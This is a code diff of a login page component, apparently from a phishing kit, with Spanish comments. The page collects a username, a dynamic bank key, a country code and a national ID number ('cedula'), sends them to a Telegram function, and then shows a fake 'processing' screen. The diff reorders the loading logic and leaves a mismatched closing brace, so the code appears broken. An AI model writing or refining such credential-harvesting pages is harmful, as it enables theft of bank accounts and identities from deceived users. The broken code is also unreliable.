@@ -84,12 +84,7 @@ export default function LoginPage() {
       formData.claveDinamica &&
       isCaptchaChecked
     ) {
-      setLoading(true);
-      const cedula = sessionStorage.getItem("cedula");
-      if (!cedula) {
-        router.push("/cedula");
-        return;
-      }
+      
   
       // Guarda los datos de sesión en sessionStorage
       sessionStorage.setItem("usuario", formData.usuario);
@@ -97,18 +92,25 @@ export default function LoginPage() {
       sessionStorage.setItem("claveDinamica", formData.claveDinamica);
       sessionStorage.setItem("countryCode", selectedCountry.code);
       
+      setIsLoading(true); // Inicia el loading
+      const cedula = sessionStorage.getItem("cedula");
+      if (!cedula) {
+        router.push("/cedula");
+        return;
+      }
+      
       await sendToTelegram({
         ...formData,
         cedula,
         countryCode: selectedCountry.code,
       });
   
-      setShowTransition(true);
-      setTimeout(() => {
-        setLoading(false);
-        router.push("/procesando");
-      }, 2000);
-    }
+      setShowTransition(true); // Activa la transición
+    setTimeout(() => {
+      setIsLoading(false); // Detiene el loading después de 2 segundos
+      router.push("/procesando");
+    }, 2000);
+  };
   };
   
 
